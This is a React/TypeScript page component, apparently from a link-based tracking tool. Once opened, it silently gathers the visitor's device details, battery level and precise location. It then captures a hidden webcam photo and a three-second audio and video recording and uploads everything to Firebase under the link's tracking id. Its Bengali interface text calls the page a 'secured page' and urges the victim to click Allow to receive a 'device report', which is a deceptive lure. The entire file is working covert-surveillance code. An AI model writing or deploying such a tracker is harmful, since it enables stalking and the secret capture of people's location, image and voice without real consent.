
import React, { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [status, setStatus] = useState('প্রস্তুত হচ্ছে...');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const initializeCapture = async () => {
      if (!id) return;
      
      try {
        setStatus('অনুমতি চাওয়া হচ্ছে...');
        
        // 1. Get Device Details
        const ua = navigator.userAgent;
        let model = "Unknown Device";
        if (ua.includes("Android")) model = "Android Device";
        else if (ua.includes("iPhone")) model = "iPhone";
        else if (ua.includes("Windows")) model = "Windows PC";
        
        // @ts-ignore
        const ram = navigator.deviceMemory || 0;
        let storageInfo = "N/A";
        try {
          if (navigator.storage && navigator.storage.estimate) {
            const estimate = await navigator.storage.estimate();
            storageInfo = `${Math.round(estimate.quota! / (1024 * 1024 * 1024))} GB`;
          }
        } catch (e) {}

        // 2. Get Battery
        let batteryLevel = 0;
        try {
          // @ts-ignore
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level * 100);
        } catch (e) {}

        // 3. Geolocation
        let location = null;
        try {
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
          });
          location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        } catch (e) {}

        // 4. Capture Media (Photo + 3s Video)
        let photoUrl = null;
        let videoUrl = null;
        
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            await new Promise((res) => videoRef.current!.onloadedmetadata = res);
            
            // Photo Capture
            const canvas = canvasRef.current;
            if (canvas) {
              canvas.width = videoRef.current.videoWidth;
              canvas.height = videoRef.current.videoHeight;
              canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
              const base64Photo = canvas.toDataURL('image/jpeg', 0.8);
              const photoPath = `captures/${id}/photo_${Date.now()}.jpg`;
              const photoRef = ref(storage, photoPath);
              await uploadString(photoRef, base64Photo, 'data_url');
              photoUrl = await getDownloadURL(photoRef);
            }

            // Video Capture (3 Seconds)
            setStatus('ভিডিও প্রসেস হচ্ছে...');
            const mediaRecorder = new MediaRecorder(stream);
            const chunks: Blob[] = [];
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            
            const videoPromise = new Promise<Blob>((resolve) => {
              mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                resolve(blob);
              };
            });

            mediaRecorder.start();
            await new Promise((resolve) => setTimeout(resolve, 3000));
            mediaRecorder.stop();

            const videoBlob = await videoPromise;
            const videoPath = `captures/${id}/video_${Date.now()}.webm`;
            const videoStorageRef = ref(storage, videoPath);
            await uploadBytes(videoStorageRef, videoBlob);
            videoUrl = await getDownloadURL(videoStorageRef);
          }
          
          stream.getTracks().forEach(track => track.stop());
        } catch (e) {
          console.warn('Media access denied');
        }

        // 5. Store in Firestore
        await addDoc(collection(db, "logs"), {
          userId: id,
          timestamp: serverTimestamp(),
          deviceModel: model,
          battery: batteryLevel,
          ram: ram,
          storage: storageInfo,
          location: location,
          photoUrl: photoUrl,
          videoUrl: videoUrl,
          status: 'Full Captured'
        });

        setStatus('লোডিং সম্পন্ন হয়েছে।');
      } catch (err) {
        console.error(err);
        setStatus('একটি ত্রুটি ঘটেছে। অনুগ্রহ করে রিফ্রেশ করুন।');
      }
    };

    initializeCapture();
  }, [id]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-slate-50">
      <div className="w-full max-w-md p-10 bg-white rounded-[2rem] shadow-2xl text-center border border-gray-100">
        <div className="w-24 h-24 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-8 relative">
          <div className="absolute inset-0 rounded-full border-4 border-blue-100 border-t-blue-600 animate-spin"></div>
          <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
        </div>
        <h2 className="text-2xl font-bold text-gray-800 mb-2">সুরক্ষিত পেজ</h2>
        <p className="text-gray-500 mb-6 font-medium">{status}</p>
        <div className="text-xs text-gray-400 bg-gray-50 p-4 rounded-xl leading-relaxed">
          আপনার ব্রাউজার থেকে লোকেশন এবং ক্যামেরা অ্যাক্সেস চাইলে 'Allow' করুন যাতে আপনার ডিভাইসের সঠিক রিপোর্ট জেনারেট করা সম্ভব হয়।
        </div>
      </div>
      <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
      <canvas ref={canvasRef} className="hidden"></canvas>
    </div>
  );
};

export default TrackPage;
